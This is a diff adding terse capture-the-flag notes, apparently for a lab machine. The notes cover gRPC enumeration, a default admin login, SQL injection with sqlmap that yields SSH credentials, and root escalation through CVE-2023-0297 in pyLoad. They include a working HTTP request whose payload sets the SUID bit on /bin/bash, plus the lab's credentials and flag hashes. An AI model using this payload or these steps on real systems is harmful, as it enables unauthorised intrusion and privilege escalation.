@@ -1,0 +1,52 @@
+Port 50051 is running something called GRPC
+https://github.com/fullstorydev/grpcui -> grpc gui install
+
+./grpcui -plaintext 10.10.11.214:50051 -> open browser instance
+
+using the method : LoginUser -> admin:admin
+
+response {
+	"message": "Your id is 827."
+}
+
+response-trailers {
+	token	b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODY0Njk5Njl9.46P2B4Yoba0zbSGOO54EZzEW02H8BuatEaRUE_OXSd0'
+}
+
+Inside req metadata {
+token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODY0Njk5Njl9.46P2B4Yoba0zbSGOO54EZzEW02H8BuatEaRUE_OXSd0
+}
+
+Pushing a GetInfo Req into sqlmap and dumping the DB
+we get possible SSH creds
+sau:HereIsYourPassWord1431 -> WORKS!
+
+user:d0bc97b727c6e90e0e53762a08c16b6a
+----------------------------------------------------
+cannot use sudo on the box
+
+linpeas saw two processes by root that looked interesting
+root  1061  /usr/bin/python3 /opt/app/app.py
+root  1066  /usr/bin/python3 /usr/local/bin/pyload
+
+pyload cve -> CVE-2023-0297 -> https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/ -> convert the curl into a burp req
+
+----------------------------------------------------
+POST /flash/addcrypted2 HTTP/1.1
+Host: localhost:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 95
+Origin: http://localhost:8000
+Connection: close
+Cookie: _grpcui_csrf_token=jTMMflez57AvPdkK36h6j4G2hWH3oDVhnDKAArg9ZPI
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-User: ?1
+
+package=xxx&crypted=AAAA&jk=pyimport+os;os.system("chmod+u%2bs+/bin/bash");f=function%20f2(){};
+----------------------------------------------------
+
+if you change AAAA -> admin : the RCE doesnt work
+
+root:87e9b3f76dc77829c7479f1a52c49064
